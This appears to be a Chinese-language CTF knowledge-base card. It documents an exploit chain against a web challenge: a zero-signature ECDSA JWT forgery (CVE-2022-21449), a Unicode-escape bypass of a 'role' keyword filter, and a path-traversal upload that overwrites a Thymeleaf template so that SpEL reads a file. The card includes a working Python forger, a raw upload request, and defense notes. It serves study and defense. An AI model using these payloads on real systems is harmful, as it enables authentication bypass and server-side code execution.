---
id: ctf-web-ecdsa-zero-signature-jwt-thymeleaf-template-overwrite
title: ECDSA 零签名伪造 JWT + \uXXXX 绕过关键字过滤 + Thymeleaf 模板覆盖 RCE
type: scenario
domain: ctf
path: ctf/web
technique: ecdsa-zero-signature-jwt-template-overwrite
tags:
- ctf
- web
- jwt
- ecdsa
- zero-signature
- cve-2022-21449
- unicode-escape
- waf-bypass
- thymeleaf
- ssti
- file-upload
- path-traversal
cve:
- CVE-2022-21449
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:02:44+08:00'
  notes: 已对照原文川味小厨段核对：ES256 JWT、r=0/s=0 DER 3006 020100 020100（base64url MAYCAQACAQA）、用 rol 后接 u0065 的 JSON Unicode 转义绕过 role 关键字过滤、admin数据回显、../templates/orders.html覆盖模板与SpEL读/flag均一致；核对方已补回原卡丢失的Unicode转义写法。未验证点：PoC未本机复跑；原文对Thymeleaf仅以模板目录推断、未直接确认引擎；CVE-2022-21449为卡片补充的技术归属，原文未点名CVE；frontmatter无sources/source_url。
url: /docs/ctf/web/ctf-web-ecdsa-zero-signature-jwt-thymeleaf-template-overwrite/
draft: false
kb_aliases:
- 川味小厨
- ECDSA 零签名
- r=0 s=0
- MAYCAQACAQA
- Psychic Signatures
- CVE-2022-21449
- \uXXXX 绕过 WAF
- Thymeleaf 模板覆盖
- filename 路径穿越
---

## 一句话结论

川味小厨用 ES256 JWT 做鉴权，但后端 jjwt/ECDSA 验签在 `r=0,s=0` 时把 `0*G` 当作无穷远点并短路返回“验证通过”，因此可用 DER `3006 020100 020100`（base64url `MAYCAQACAQA`）伪造任意 payload 的 JWT；后端在 JSON 解析前做关键字过滤，检测到 `role` 就报错，但 JSON 允许 `\uXXXX` 转义，用 `rol\u0065` 可绕过。拿到 admin 后，菜品上架接口的文件名直接拼接路径，上传 `../templates/orders.html` 覆盖 Thymeleaf 模板，模板里的 `th:text="${new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()}"` 在访问订单页时执行，读出 flag。

## 原理

- **ECDSA 验签与零签名**：标准 ECDSA 验签计算 `R' = (hash * s^{-1}) * G + (r * s^{-1}) * Q`，要求 `r,s != 0` 且在曲线阶内。若库未校验 `r,s` 非零，`r=0,s=0` 会导致除零/无穷远点；有漏洞的 Java 实现（如 CVE-2022-21449，Psychic Signatures）在处理无穷远点时短路返回成功，不比较 `R'.x == r`。
- **JWT 伪造**：把 header/body 做 base64url，签名段填 `MAYCAQACAQA`；payload 可写 `{"phone":"admin","role":"admin","sid":"exp"}`。
- **关键字过滤绕过**：后端在 JSON 解析前用字符串匹配过滤 `role`，但 JSON 规范允许键名用 `\uXXXX` 表示任意 Unicode；`rol\u0065` 解析后是 `role`，过滤层看不到字面量。注意 Python 字符串/`json.dumps` 会二次转义反斜杠，需手动构造 JSON 字符串。
- **Thymeleaf 模板覆盖**：Spring Boot 默认 `spring.thymeleaf.prefix=classpath:/templates/`、`suffix=.html`；上传接口把用户文件名直接拼进保存路径，`../templates/orders.html` 可穿越到模板目录并覆盖订单页模板。Thymeleaf 的 `th:text` 会执行 `${...}` 中的 SpEL，`new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()` 读取 flag 并渲染。
- **为什么链能通**：JWT 零签名绕过认证 → Unicode 转义绕过 WAF → 管理员上传路径穿越 → 模板覆盖 → SpEL 执行，四步各自是常见缺陷，组合后完整 RCE。

## 触发条件

- 使用存在零签名/无穷远点校验缺陷的 ECDSA JWT 库（如未修复 CVE-2022-21449 的 Java 版本/jjwt）。
- 鉴权只校验 JWT 签名，不校验 `r,s` 非零；payload 中角色字段可被信任。
- WAF/过滤器在 JSON 解析前做关键字匹配，未做 Unicode 规范化。
- 上传接口文件名未净化，可直接拼路径；模板目录可写且模板引擎会执行表达式。
- 有可访问的 Thymeleaf 模板页面（如 `/admin/orders`）。

## 利用步骤

1. 抓取普通用户 JWT，解码 payload 确认 `role/phone/sid` 字段与 ES256。
2. 构造零签名 JWT：header `{"alg":"ES256","typ":"JWT"}`、body 用 `rol\u0065` 代替 `role`，签名固定 `MAYCAQACAQA`。
3. 发送到需要管理员的接口，确认 200/拿到 admin 数据；必要时用返回的密码登录后台。
4. 进入上架菜品/上传接口，抓包把 filename 改为 `../templates/orders.html`，内容为 Thymeleaf `th:text` SpEL 读 `/flag`。
5. 访问 `/admin/orders` 触发模板渲染，读取 flag。

## PoC

零签名 JWT：

```python
import base64

def b64e(s):
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

header = b64e('{"alg":"ES256","typ":"JWT"}')
body = b64e('{"phone":"admin","rol\\u0065":"admin","sid":"exp"}')
sig = "MAYCAQACAQA"
print(f"{header}.{body}.{sig}")
```

上传覆盖模板（multipart）：

```http
POST /admin/api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="../templates/orders.html"
Content-Type: image/jpeg

<div th:text="${new java.io.BufferedReader(new java.io.FileReader('/flag')).readLine()}"></div>
------x--
```

## 变体与关联

- 零签名可换成其他 ECDSA 实现缺陷（`r=0`、`s=0`、曲线点未校验、DER 解析差异）；CVE-2022-21449 影响多个 Java 版本。
- 关键字过滤绕过可换成 Unicode 转义、大小写、注释、重复键、编码/分块；核心是过滤层与解析层语义不一致。
- 模板覆盖可换成 Thymeleaf/Freemarker/Velocity 模板上传、日志包含、SSTI；上传路径穿越可换成 zip-slip、符号链接。
- 关联：JWT 算法/签名绕过、CVE-2022-21449、Java 模板注入、文件上传路径穿越卡。

## 检测与防御

- 升级 JDK/加密库修复 CVE-2022-21449；验签前强制校验 `r,s != 0`、在曲线阶内、点在曲线上。
- 不要只依赖 JWT 签名；角色/权限从服务端会话/数据库读取，校验 `iss/aud/exp` 与算法白名单。
- WAF 在 JSON 解析后做语义检查；对 `\uXXXX`、重复键、编码做规范化。
- 上传文件名使用 basename/白名单，保存目录与模板目录隔离；模板目录只读、禁止用户上传覆盖。
- 检测：JWT 签名段为 `MAYCAQACAQA`/r=s=0；JSON 键含 `\u` 转义；上传文件名含 `../`/模板后缀；模板目录文件被修改。
